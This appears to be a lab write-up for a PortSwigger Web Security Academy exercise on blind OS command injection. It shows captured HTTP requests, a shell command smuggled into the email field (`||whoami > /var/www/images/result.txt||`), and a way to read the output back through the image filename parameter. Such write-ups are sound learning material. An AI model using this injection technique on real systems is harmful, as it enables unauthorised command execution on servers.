# [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

> exploiting a blind OS command injection vulnerability on a writable folder

- target folder `/var/www/images/`

> intercept a submitted feedback request

```
POST /feedback/submit HTTP/2
Host: xxx.web-security-academy.net
Cookie: session=SRW8dCBstsllEw0qogwib2zBukxGKqvo
Content-Length: 86
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://xxx.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xxx.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=H4NWHMu8iW1xdy9rgkXDYePhjSZyQQqS&name=qwe&email=qwe%40qwe&subject=qwe&message=qwe
```

- the focus part is the `csrf=H4NWHMu8iW1xdy9rgkXDYePhjSZyQQqS&name=qwe&email=qwe%40qwe&subject=qwe&message=qwe`

> testing vulnerable parameter

- add a `|` one by one at the end of every parameter value end
- `&name=qwe|&` or `&email=qwe%40qwe|&`
- any changes in response could indicate a vulnerable parameter
- in this case the `email` it is

> the exploit

- foreword the request with the email updated with `...&email=qwe%40qwe||whoami > /var/www/images/result.txt||&...`

```
csrf=yyy&name=qwe&email=qwe%40qwe||whoami > /var/www/images/result.txt||&subject=qwe&message=qwe
```

- then intercept a product page
- during product page load there is an image download

```
GET /image?filename=68.jpg HTTP/2
Host: xxx.web-security-academy.net
Cookie: session=SRW8dCBstsllEw0qogwib2zBukxGKqvo
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://xxx.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

- change the `/image?filename=68.jpg` to `/image?filename=result.txt`
